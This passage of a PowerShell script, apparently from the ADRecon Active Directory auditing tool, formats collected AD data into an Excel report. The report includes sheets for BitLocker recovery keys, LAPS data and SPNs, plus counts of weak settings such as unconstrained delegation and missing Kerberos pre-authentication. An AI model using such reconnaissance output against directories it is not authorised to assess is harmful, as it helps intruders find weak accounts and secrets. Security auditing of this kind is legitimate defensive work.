        [Parameter(Mandatory = $true)]
        [string] $Title2,

        [Parameter(Mandatory = $true)]
        [System.Object] $ObjAttributes
    )

    $excel.ScreenUpdating = $false
    $worksheet = $workbook.Worksheets.Item(1)
    $SrcWorksheet = $workbook.Sheets.Item($SrcSheetName)

    $row = 1
    $column = 1
    $worksheet.Cells.Item($row, $column) = $Title1
    $worksheet.Cells.Item($row,$column).Style = "Heading 2"
    $worksheet.Cells.Item($row,$column).HorizontalAlignment = -4108
    $MergeCells = $worksheet.Range("A1:C1")
    $MergeCells.Select() | Out-Null
    $MergeCells.MergeCells = $true
    Remove-Variable MergeCells

    Get-ADRExcelPivotTable -SrcSheetName $SrcSheetName -PivotTableName "User Status" -PivotRows @("Enabled") -PivotValues @("UserName") -PivotPercentage @("UserName") -PivotLocation "R2C1"
    $excel.ScreenUpdating = $false

    $row = 2
    "Type","Count","Percentage" | ForEach-Object {
        $worksheet.Cells.Item($row, $column) = $_
        $worksheet.Cells.Item($row, $column).Font.Bold = $True
        $column++
    }

    $row = 3
    $column = 1
    For($row = 3; $row -le 6; $row++)
    {
        $temptext = [string] $worksheet.Cells.Item($row, $column).Text
        switch ($temptext.ToUpper())
        {
            "TRUE" { $worksheet.Cells.Item($row, $column) = "Enabled" }
            "FALSE" { $worksheet.Cells.Item($row, $column) = "Disabled" }
            "GRAND TOTAL" { $worksheet.Cells.Item($row, $column) = "Total" }
        }
    }

    $row = 1
    $column = 6
    $worksheet.Cells.Item($row, $column) = $Title2
    $worksheet.Cells.Item($row,$column).Style = "Heading 2"
    $worksheet.Cells.Item($row,$column).HorizontalAlignment = -4108
    $MergeCells = $worksheet.Range("F1:L1")
    $MergeCells.Select() | Out-Null
    $MergeCells.MergeCells = $true
    Remove-Variable MergeCells

    $row++
    "Category","Enabled Count","Enabled Percentage","Disabled Count","Disabled Percentage","Total Count","Total Percentage" | ForEach-Object {
        $worksheet.Cells.Item($row, $column) = $_
        $worksheet.Cells.Item($row, $column).Font.Bold = $True
        $column++
    }

    $ExcelColumn = ($SrcWorksheet.Columns.Find("Enabled"))
    $EnabledColAddress = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"

    $column = 6
    $i = 2

    $ObjAttributes.keys | ForEach-Object {
        $ExcelColumn = ($SrcWorksheet.Columns.Find($_))
        $ColAddress = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
        $row++
        $i++
        If ($_ -eq "Delegation Typ")
        {
            $worksheet.Cells.Item($row, $column) = "Unconstrained Delegation"
        }
        ElseIf ($_ -eq "Delegation Type")
        {
            $worksheet.Cells.Item($row, $column) = "Constrained Delegation"
        }
        Else
        {
            $worksheet.Cells.Item($row, $column).Formula = '=' + $SrcWorksheet.Name + '!' + $ExcelColumn.Address($false,$false)
        }
        $worksheet.Cells.Item($row, $column+1).Formula = '=COUNTIFS(' + $SrcWorksheet.Name + '!' + $EnabledColAddress + ',"TRUE",' + $SrcWorksheet.Name + '!' + $ColAddress + ',' + $ObjAttributes[$_] + ')'
        $worksheet.Cells.Item($row, $column+2).Formula = '=IFERROR(G' + $i + '/VLOOKUP("Enabled",A3:B6,2,FALSE),0)'
        $worksheet.Cells.Item($row, $column+3).Formula = '=COUNTIFS(' + $SrcWorksheet.Name + '!' + $EnabledColAddress + ',"FALSE",' + $SrcWorksheet.Name + '!' + $ColAddress + ',' + $ObjAttributes[$_] + ')'
        $worksheet.Cells.Item($row, $column+4).Formula = '=IFERROR(I' + $i + '/VLOOKUP("Disabled",A3:B6,2,FALSE),0)'
        If ( ($_ -eq "SIDHistory") -or ($_ -eq "ms-ds-CreatorSid") )
        {
            $worksheet.Cells.Item($row, $column+5).Formula = '=COUNTIF(' + $SrcWorksheet.Name + '!' + $ColAddress + ',' + $ObjAttributes[$_] + ')-1'
        }
        Else
        {
            $worksheet.Cells.Item($row, $column+5).Formula = '=COUNTIF(' + $SrcWorksheet.Name + '!' + $ColAddress + ',' + $ObjAttributes[$_] + ')'
        }
        $worksheet.Cells.Item($row, $column+6).Formula = '=IFERROR(K' + $i + '/VLOOKUP("Total",A3:B6,2,FALSE),0)'
    }


    "H", "J" , "L" | ForEach-Object {
        $rng = $_ + $($row - $ObjAttributes.Count + 1) + ":" + $_ + $($row)
        $worksheet.Range($rng).NumberFormat = "0.00%"
    }
    $excel.ScreenUpdating = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $SrcWorksheet
    Remove-Variable SrcWorksheet
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelChart
{

    param (
        [Parameter(Mandatory = $true)]
        [string] $ChartType,

        [Parameter(Mandatory = $true)]
        [int] $ChartLayout,

        [Parameter(Mandatory = $true)]
        [string] $ChartTitle,

        [Parameter(Mandatory = $true)]
        $RangetoCover,

        [Parameter(Mandatory = $false)]
        $ChartData = $null,

        [Parameter(Mandatory = $false)]
        $StartRow = $null,

        [Parameter(Mandatory = $false)]
        $StartColumn = $null
    )

    $excel.ScreenUpdating = $false
    $excel.DisplayAlerts = $false
    $worksheet = $workbook.Worksheets.Item(1)
    $chart = $worksheet.Shapes.AddChart().Chart

    $chart.chartType = [int]([Microsoft.Office.Interop.Excel.XLChartType]::$ChartType)
    $chart.ApplyLayout($ChartLayout)
    If ($null -eq $ChartData)
    {
        If ($null -eq $StartRow)
        {
            $start = $worksheet.Range("A1")
        }
        Else
        {
            $start = $worksheet.Range($StartRow)
        }

        $X = $worksheet.Range($start,$start.End([Microsoft.Office.Interop.Excel.XLDirection]::xlDown))
        If ($null -eq $StartColumn)
        {
            $start = $worksheet.Range("B1")
        }
        Else
        {
            $start = $worksheet.Range($StartColumn)
        }

        $Y = $worksheet.Range($start,$start.End([Microsoft.Office.Interop.Excel.XLDirection]::xlDown))
        $ChartData = $worksheet.Range($X,$Y)

        Get-ADRExcelComObjRelease -ComObjtoRelease $X
        Remove-Variable X
        Get-ADRExcelComObjRelease -ComObjtoRelease $Y
        Remove-Variable Y
        Get-ADRExcelComObjRelease -ComObjtoRelease $start
        Remove-Variable start
    }
    $chart.SetSourceData($ChartData)

    $chart.PlotBy = [Microsoft.Office.Interop.Excel.XlRowCol]::xlColumns
    $chart.seriesCollection(1).Select() | Out-Null
    $chart.SeriesCollection(1).ApplyDataLabels() | out-Null

    $chart.HasTitle = $True
    $chart.ChartTitle.Text = $ChartTitle

    $temp = $worksheet.Range($RangetoCover)

    $chart.parent.top = $temp.Top
    $chart.parent.left = $temp.Left
    $chart.parent.width = $temp.Width
    If ($ChartTitle -ne "Privileged Groups in AD")
    {
        $chart.parent.height = $temp.Height
    }

    $excel.ScreenUpdating = $true
    $excel.DisplayAlerts = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $chart
    Remove-Variable chart
    Get-ADRExcelComObjRelease -ComObjtoRelease $ChartData
    Remove-Variable ChartData
    Get-ADRExcelComObjRelease -ComObjtoRelease $temp
    Remove-Variable temp
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelSort
{

    param (
        [Parameter(Mandatory = $true)]
        [string] $ColumnName
    )

    $worksheet = $workbook.Worksheets.Item(1)
    $worksheet.Activate();

    $ExcelColumn = ($worksheet.Columns.Find($ColumnName))
    If ($ExcelColumn)
    {
        If ($ExcelColumn.Text -ne $ColumnName)
        {
            $BeginAddress = $ExcelColumn.Address(0,0,1,1)
            $End = $False
            Do {
                Write-Verbose "[Get-ADRExcelSort] $($ExcelColumn.Text) selected instead of $($ColumnName) in the $($worksheet.Name) worksheet."
                $ExcelColumn = ($worksheet.Columns.FindNext($ExcelColumn))
                $Address = $ExcelColumn.Address(0,0,1,1)
                If ( ($Address -eq $BeginAddress) -or ($ExcelColumn.Text -eq $ColumnName) )
                {
                    $End = $True
                }
            } Until ($End -eq $True)
        }
        If ($ExcelColumn.Text -eq $ColumnName)
        {

            $workSheet.ListObjects.Item(1).Sort.SortFields.Clear()
            $workSheet.ListObjects.Item(1).Sort.SortFields.Add($ExcelColumn) | Out-Null
            $worksheet.ListObjects.Item(1).Sort.Apply()
        }
        Else
        {
            Write-Verbose "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet."
        }
    }
    Else
    {
        Write-Verbose "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet."
    }
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Export-ADRExcel
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $ExcelPath
    )

    $ExcelPath = $((Convert-Path $ExcelPath).TrimEnd("\"))
    $ReportPath = -join($ExcelPath,'\','CSV-Files')
    If (!(Test-Path $ReportPath))
    {
        Write-Warning "[Export-ADRExcel] Could not locate the CSV-Files directory ... Exiting"
        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        Return $null
    }
    Get-ADRExcelComObj
    If ($excel)
    {
        Write-Output "[*] Generating ADRecon-Report.xlsx"

        $ADFileName = -join($ReportPath,'\','AboutThisScan.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            $workbook.Worksheets.Item(1).Name = "About ADRecon"
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(3,2) , "https://github.com/sense-of-security/ADRecon", "" , "", "github.com/sense-of-security/ADRecon") | Out-Null
            $workbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() | Out-Null
        }

        $ADFileName = -join($ReportPath,'\','Forest.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Forest"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','Domain.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Domain"
            Get-ADRExcelImport -ADFileName $ADFileName
            $DomainObj = Import-CSV -Path $ADFileName
            Remove-Variable ADFileName
            $DomainName = -join($DomainObj[0].Value,"-")
            Remove-Variable DomainObj
        }

        $ADFileName = -join($ReportPath,'\','Trusts.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Trusts"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','Subnets.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Subnets"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','Sites.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Sites"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','FineGrainedPasswordPolicy.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Fine Grained Password Policy"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','DefaultPasswordPolicy.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Default Password Policy"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            $excel.ScreenUpdating = $false
            $worksheet = $workbook.Worksheets.Item(1)

            $worksheet.Range("B2:G10").HorizontalAlignment = -4108


            "A2:B10", "C2:D10", "E2:F10", "G2:G10" | ForEach-Object {
                $worksheet.Range($_).BorderAround(1) | Out-Null
            }






            $ObjValues = @(

            "C2", '=IF(B2<4,TRUE, FALSE)'


            "C3", '=IF(OR(B3=0,B3>90),TRUE, FALSE)'




            "C5", '=IF(B5<7,TRUE, FALSE)'


            "C6", '=IF(B6<>TRUE,TRUE, FALSE)'




            "C8", '=IF(AND(B8>=1,B8<30),TRUE, FALSE)'


            "C9", '=IF(OR(B9=0,B9>6),TRUE, FALSE)'




            "E2", '=IF(B2<8,TRUE, FALSE)'


            "E3", '=IF(OR(B3=0,B3>90),TRUE, FALSE)'


            "E4", '=IF(B4=0,TRUE, FALSE)'


            "E5", '=IF(B5<13,TRUE, FALSE)'


            "E6", '=IF(B6<>TRUE,TRUE, FALSE)'






            "E9", '=IF(OR(B9=0,B9>5),TRUE, FALSE)'




            "G2", '=IF(B2<24,TRUE, FALSE)'


            "G3", '=IF(OR(B3=0,B3>60),TRUE, FALSE)'


            "G4", '=IF(B4=0,TRUE, FALSE)'


            "G5", '=IF(B5<14,TRUE, FALSE)'


            "G6", '=IF(B6<>TRUE,TRUE, FALSE)'


            "G7", '=IF(B7<>FALSE,TRUE, FALSE)'


            "G8", '=IF(AND(B8>=1,B8<15),TRUE, FALSE)'


            "G9", '=IF(OR(B9=0,B9>10),TRUE, FALSE)'


            "G10", '=IF(B10<15,TRUE, FALSE)' )

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $worksheet.Range($ObjValues[$i]).FormatConditions.Add([Microsoft.Office.Interop.Excel.XlFormatConditionType]::xlExpression, 0, $ObjValues[$i+1]) | Out-Null
                $i++
            }

            "C2", "C3" , "C5", "C6", "C8", "C9", "E2", "E3" , "E4", "E5", "E6", "E9", "G2", "G3", "G4", "G5", "G6", "G7", "G8", "G9", "G10" | ForEach-Object {
                $worksheet.Range($_).FormatConditions.Item(1).StopIfTrue = $false
                $worksheet.Range($_).FormatConditions.Item(1).Font.ColorIndex = 3
            }

            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , "https://www.pcisecuritystandards.org/document_library?category=pcidss&document=pci_dss", "" , "", "PCI DSS v3.2.1") | Out-Null
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,6) , "https://acsc.gov.au/infosec/ism/", "" , "", "2018 ISM Controls") | Out-Null
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,7) , "https://www.cisecurity.org/benchmark/microsoft_windows_server/", "" , "", "CIS Benchmark 2016") | Out-Null

            $excel.ScreenUpdating = $true
            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        $ADFileName = -join($ReportPath,'\','DomainControllers.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Domain Controllers"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','DACLs.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "DACLs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','SACLs.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "SACLs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','GPOs.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "GPOs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','gPLinks.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "gPLinks"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','DNSNodes','.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "DNS Records"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','DNSZones.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "DNS Zones"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','Printers.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Printers"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','BitLockerRecoveryKeys.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "BitLocker"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','LAPS.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "LAPS"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','ComputerSPNs.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Computer SPNs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName "Name"
        }

        $ADFileName = -join($ReportPath,'\','Computers.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Computers"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName "UserName"

            $worksheet = $workbook.Worksheets.Item(1)

            $worksheet.Select()
            $worksheet.Application.ActiveWindow.splitcolumn = 1
            $worksheet.Application.ActiveWindow.splitrow = 1
            $worksheet.Application.ActiveWindow.FreezePanes = $true

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        $ADFileName = -join($ReportPath,'\','OUs.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "OUs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','UserSPNs.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "User SPNs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','Groups.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Groups"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName "DistinguishedName"
        }

        $ADFileName = -join($ReportPath,'\','GroupMembers.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Group Members"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName "Group Name"
        }

        $ADFileName = -join($ReportPath,'\','Users.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Users"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName "UserName"

            $worksheet = $workbook.Worksheets.Item(1)


            $worksheet.Select()
            $worksheet.Application.ActiveWindow.splitcolumn = 1
            $worksheet.Application.ActiveWindow.splitrow = 1
            $worksheet.Application.ActiveWindow.FreezePanes = $true

            $worksheet.Cells.Item(1,3).Interior.ColorIndex = 5
            $worksheet.Cells.Item(1,3).font.ColorIndex = 2

            $worksheet.UsedRange.Select() | Out-Null
            $excel.Selection.AutoFilter(3,$true) | Out-Null
            $worksheet.Cells.Item(1,1).Select() | Out-Null
            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }


        $ADFileName = -join($ReportPath,'\','ComputerSPNs.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Computer Role Stats"
            Remove-Variable ADFileName

            $worksheet = $workbook.Worksheets.Item(1)
            $PivotTableName = "Computer SPNs"
            Get-ADRExcelPivotTable -SrcSheetName "Computer SPNs" -PivotTableName $PivotTableName -PivotRows @("Service") -PivotValues @("Service")

            $worksheet.Cells.Item(1,1) = "Computer Role"
            $worksheet.Cells.Item(1,2) = "Count"


            $worksheet.PivotTables($PivotTableName).PivotFields("Service").AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,"Count")

            Get-ADRExcelChart -ChartType "xlColumnClustered" -ChartLayout 10 -ChartTitle "Computer Roles in AD" -RangetoCover "D2:U16"
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , "" , "'Computer SPNs'!A1", "", "Raw Data") | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
            Remove-Variable PivotTableName

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }


        $ADFileName = -join($ReportPath,'\','Computers.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Operating System Stats"
            Remove-Variable ADFileName

            $worksheet = $workbook.Worksheets.Item(1)
            $PivotTableName = "Operating Systems"
            Get-ADRExcelPivotTable -SrcSheetName "Computers" -PivotTableName $PivotTableName -PivotRows @("Operating System") -PivotValues @("Operating System")

            $worksheet.Cells.Item(1,1) = "Operating System"
            $worksheet.Cells.Item(1,2) = "Count"


            $worksheet.PivotTables($PivotTableName).PivotFields("Operating System").AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,"Count")

            Get-ADRExcelChart -ChartType "xlColumnClustered" -ChartLayout 10 -ChartTitle "Operating Systems in AD" -RangetoCover "D2:S16"
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , "" , "Computers!A1", "", "Raw Data") | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
            Remove-Variable PivotTableName

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }


        $ADFileName = -join($ReportPath,'\','GroupMembers.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Privileged Group Stats"
            Remove-Variable ADFileName

            $worksheet = $workbook.Worksheets.Item(1)
            $PivotTableName = "Group Members"
            Get-ADRExcelPivotTable -SrcSheetName "Group Members" -PivotTableName $PivotTableName -PivotRows @("Group Name")-PivotFilters @("AccountType") -PivotValues @("AccountType")


            $worksheet.PivotTables($PivotTableName).PivotFields("AccountType").CurrentPage = "user"

            $worksheet.Cells.Item(1,2).Interior.ColorIndex = 5
            $worksheet.Cells.Item(1,2).font.ColorIndex = 2

            $worksheet.Cells.Item(3,1) = "Group Name"
            $worksheet.Cells.Item(3,2) = "Count (Not-Recursive)"

            $excel.ScreenUpdating = $false

            $PivotTableTemp = ($workbook.PivotCaches().Item($workbook.PivotCaches().Count)).CreatePivotTable("R1C5","PivotTableTemp")
            $PivotFieldTemp = $PivotTableTemp.PivotFields("Group Name")

            $PivotFieldTemp.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlPageField
            Try
            {
                $PivotFieldTemp.CurrentPage = "Domain Admins"
            }
            Catch
            {

                $NoDA = $true
            }
            If ($NoDA)
            {
                Try
                {
                    $PivotFieldTemp.CurrentPage = "Administrators"
                }
                Catch
                {

                }
            }

            $PivotSlicer = $workbook.SlicerCaches.Add($PivotTableTemp,$PivotFieldTemp)

            $PivotSlicer.PivotTables.AddPivotTable($worksheet.PivotTables($PivotTableName))

            $PivotSlicer.Delete()

            $PivotTableTemp.TableRange2.Delete() | Out-Null

            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotFieldTemp
            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotSlicer
            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotTableTemp

            Remove-Variable PivotFieldTemp
            Remove-Variable PivotSlicer
            Remove-Variable PivotTableTemp

            "Account Operators","Administrators","Backup Operators","Cert Publishers","Crypto Operators","DnsAdmins","Domain Admins","Enterprise Admins","Enterprise Key Admins","Incoming Forest Trust Builders","Key Admins","Microsoft Advanced Threat Analytics Administrators","Network Operators","Print Operators","Remote Desktop Users","Schema Admins","Server Operators" | ForEach-Object {
                Try
                {
                    $worksheet.PivotTables($PivotTableName).PivotFields("Group Name").PivotItems($_).Visible = $true
                }
                Catch
                {

                }
            }


            $worksheet.PivotTables($PivotTableName).PivotFields("Group Name").AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,"Count (Not-Recursive)")

            $worksheet.Cells.Item(3,1).Interior.ColorIndex = 5
            $worksheet.Cells.Item(3,1).font.ColorIndex = 2

            $excel.ScreenUpdating = $true

            Get-ADRExcelChart -ChartType "xlColumnClustered" -ChartLayout 10 -ChartTitle "Privileged Groups in AD" -RangetoCover "D2:P16" -StartRow "A3" -StartColumn "B3"
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , "" , "'Group Members'!A1", "", "Raw Data") | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }


        $ADFileName = -join($ReportPath,'\','Computers.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Computer Stats"
            Remove-Variable ADFileName

            $ObjAttributes = New-Object System.Collections.Specialized.OrderedDictionary
            $ObjAttributes.Add("Delegation Typ",'"Unconstrained"')
            $ObjAttributes.Add("Delegation Type",'"Constrained"')
            $ObjAttributes.Add("SIDHistory",'"*"')
            $ObjAttributes.Add("Dormant",'"TRUE"')
            $ObjAttributes.Add("Password Age (> ",'"TRUE"')
            $ObjAttributes.Add("ms-ds-CreatorSid",'"*"')

            Get-ADRExcelAttributeStats -SrcSheetName "Computers" -Title1 "Computer Accounts in AD" -Title2 "Status of Computer Accounts" -ObjAttributes $ObjAttributes
            Remove-Variable ObjAttributes

            Get-ADRExcelChart -ChartType "xlPie" -ChartLayout 3 -ChartTitle "Computer Accounts in AD" -RangetoCover "A11:D23" -ChartData $workbook.Worksheets.Item(1).Range("A3:A4,B3:B4")
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(10,1) , "" , "Computers!A1", "", "Raw Data") | Out-Null

            Get-ADRExcelChart -ChartType "xlBarClustered" -ChartLayout 1 -ChartTitle "Status of Computer Accounts" -RangetoCover "F11:L23" -ChartData $workbook.Worksheets.Item(1).Range("F2:F8,G2:G8")
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(10,6) , "" , "Computers!A1", "", "Raw Data") | Out-Null

            $workbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
        }


        $ADFileName = -join($ReportPath,'\','Users.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "User Stats"
            Remove-Variable ADFileName

            $ObjAttributes = New-Object System.Collections.Specialized.OrderedDictionary
            $ObjAttributes.Add("Must Change Password at Logon",'"TRUE"')
            $ObjAttributes.Add("Cannot Change Password",'"TRUE"')
            $ObjAttributes.Add("Password Never Expires",'"TRUE"')
            $ObjAttributes.Add("Reversible Password Encryption",'"TRUE"')
            $ObjAttributes.Add("Smartcard Logon Required",'"TRUE"')
            $ObjAttributes.Add("Delegation Permitted",'"TRUE"')
            $ObjAttributes.Add("Kerberos DES Only",'"TRUE"')
            $ObjAttributes.Add("Kerberos RC4",'"TRUE"')
            $ObjAttributes.Add("Does Not Require Pre Auth",'"TRUE"')
            $ObjAttributes.Add("Password Age (> ",'"TRUE"')
            $ObjAttributes.Add("Account Locked Out",'"TRUE"')
            $ObjAttributes.Add("Never Logged in",'"TRUE"')
            $ObjAttributes.Add("Dormant",'"TRUE"')
            $ObjAttributes.Add("Password Not Required",'"TRUE"')
            $ObjAttributes.Add("Delegation Typ",'"Unconstrained"')
            $ObjAttributes.Add("SIDHistory",'"*"')

            Get-ADRExcelAttributeStats -SrcSheetName "Users" -Title1 "User Accounts in AD" -Title2 "Status of User Accounts" -ObjAttributes $ObjAttributes
            Remove-Variable ObjAttributes

            Get-ADRExcelChart -ChartType "xlPie" -ChartLayout 3 -ChartTitle "User Accounts in AD" -RangetoCover "A21:D33" -ChartData $workbook.Worksheets.Item(1).Range("A3:A4,B3:B4")
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(20,1) , "" , "Users!A1", "", "Raw Data") | Out-Null

            Get-ADRExcelChart -ChartType "xlBarClustered" -ChartLayout 1 -ChartTitle "Status of User Accounts" -RangetoCover "F21:L43" -ChartData $workbook.Worksheets.Item(1).Range("F2:F18,G2:G18")
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(20,6) , "" , "Users!A1", "", "Raw Data") | Out-Null

            $workbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
        }


        Get-ADRExcelWorkbook -Name "Table of Contents"
        $worksheet = $workbook.Worksheets.Item(1)

        $excel.ScreenUpdating = $false




